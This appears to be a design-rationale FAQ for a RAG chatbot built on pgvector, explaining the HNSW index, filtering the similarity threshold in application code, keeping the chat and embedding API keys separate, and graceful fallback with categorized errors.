A B-tree index is built for ordered scalar comparisons (`WHERE x > 5`). Vector similarity is fundamentally different: we're asking "find rows nearest this query point in 1536-dimensional space" - there's no useful ordering to scan along. Brute force would require computing cosine distance against every row in the table (`SELECT … ORDER BY embedding <=> $1 LIMIT 5` without an index does exactly this). For 50 chunks it's fine; for 5 million it's death. HNSW (Hierarchical Navigable Small World) is an _approximate_ nearest-neighbor index that builds a multi-layer graph of vectors where each vector is connected to its closest few neighbors at each layer. Query time, you start at the top sparse layer, hop to the nearest neighbor, descend a layer, hop again - the algorithm converges on the top-k nearest vectors in roughly log(N) hops instead of N comparisons. The trade-off is "approximate" - HNSW might miss the true #1 nearest vector in rare cases, returning a slightly less-optimal one instead. For RAG retrieval this is invisible (top-5 vs top-5-with-one-rank-off doesn't change which chunks the model sees). The two tuning knobs - `m` (graph connectivity, default 16) and `ef_construction` (build-time search width, default 64) - trade index size and build time for recall quality. The pgvector defaults are well-chosen for our scale; we don't tune them.

> Why filter the similarity threshold in JavaScript instead of in the SQL `WHERE` clause?

Because mixing a threshold predicate with an `ORDER BY embedding <=> q LIMIT k` confuses the HNSW query plan. The index is built to return approximate nearest neighbors in order, but adding `WHERE (1 - (embedding <=> q)) >= 0.5` forces the planner to either (a) post-filter every approximate neighbor it walks until it finds enough that pass the threshold (slow, unpredictable), or (b) fall back to a sequential scan to evaluate the predicate against every row (defeating the index entirely). The clean pattern is: let the index do exactly what it's good at - `ORDER BY <=> q LIMIT k` to get the top-k candidates fast - then evaluate the relevance threshold in JavaScript against the tiny returned set. We lose the (small) optimization of letting Postgres skip already-too-distant rows, but we gain a deterministic, index-using plan that's resilient to data distribution changes.

> Why is the embedding key INTENTIONALLY separate from the chat key? Couldn't we just reuse the same OpenAI key for both?

This is a UX decoupling, not a security one. The product premise is BYO-key - users supply their _chat_ provider's key (Anthropic, OpenAI, Google, Azure). For Anthropic users (the default), forcing them to also have an OpenAI account just to enable semantic search would gate the feature behind a second signup. By splitting the two keys: an Anthropic user can opt into RAG by adding an OpenAI key, OR skip RAG entirely (falling back to the Stage 2 full-context path) with no penalty. The keys live in separate localStorage slots (`probot.llm.key.v1` and `probot.embedding.key.v1`) so toggling chat providers never wipes the embedding key. Implementation-wise, the chat route reads them from separate headers (`x-llm-api-key`, `x-embedding-api-key`) and never logs either. The security model is identical for both - localStorage-only, header-only transport, key-shaped strings never written to disk - but the UX is that one is required and one is optional.

> Why does the chat route silently fall back to full-context when retrieval fails, instead of returning a 5xx?

Because the user experience priority is **chat must keep working**. Retrieval can fail for a dozen reasons - OpenAI account hit a rate limit, embedding model was deprecated, pgvector extension somehow got disabled, the stored vectors are 1536d but the index was built for 768d, the query embedding network call timed out. In each case the bot _could_ still answer using the legacy full-context path (`bots.context_text`), which contains all the same source material the embeddings were derived from. Returning 500 to the user would make the entire chat unusable, when graceful degradation is right there. The trade-off this introduces is **silent quality regression**: a recruiter might get a worse answer than they should, with no visible signal that the system is in degraded mode. The fix is making the failure observable on the _operator_ side - the warn log carries the error category (`{ provider: "openai", category: "rate_limit", … }`) so a properly-instrumented production monitor (Sentry, Datadog) can alert on these without involving the user. The chat path itself stays clean.

> Why is the embedding error returned as `EmbeddingError.category` (e.g. `"invalid_key"`) instead of the raw message?

Two reasons. First, **key safety** (same principle as `ProviderError.toJSON()` covered earlier) - SDK error messages can carry the request headers in their `.message` property, and the BYO key rides in those headers. Even if today's OpenAI SDK doesn't do this, the contract should never depend on a downstream library's discretion. The category enum (`invalid_key | rate_limit | dimension_mismatch | empty_input | unknown`) is small, fixed, and known-safe by construction. Second, **client UX consistency** - the UI's switch statement maps `"invalid_key"` → "Your OpenAI key looks wrong" and `"rate_limit"` → "Your OpenAI account is being throttled," with localized strings under the developer's control. If we passed through SDK strings, a model rename in the OpenAI SDK could break the UI overnight. The route is the trust boundary; whatever it returns, the client treats as canonical.

---
